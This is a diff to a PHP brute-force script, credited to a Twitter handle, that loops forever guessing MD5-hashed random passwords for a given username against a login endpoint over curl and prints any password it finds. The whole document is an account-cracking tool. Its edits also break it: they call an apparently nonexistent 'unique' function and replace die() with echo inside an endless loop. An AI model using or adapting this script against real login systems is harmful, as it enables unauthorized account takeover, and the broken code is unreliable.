@@ -5,10 +5,10 @@ echo "https://twitter.com/LizardL4nds";
 
 while(True)
 {     
-	$Pass = md5(rand(1, 20));
+	$Pass = md5(unique(rand(), true));
 
 	if(check_correct($username, $Pass)) {
-            die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
+            echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
         <td>
             <div align='center'><b>Found the password of: ".$Pass."<br> For the account: ".$username."</b></div>
@@ -16,7 +16,7 @@ while(True)
     </tr>
 </table>
 </body>
-</html>");
+</html>";
     
 }
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
@@ -43,7 +43,7 @@ function check_correct($username, $password)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "Error") {return true;}
+	if($str != "wrong") {return true;}
         else {return false;}
 }
 
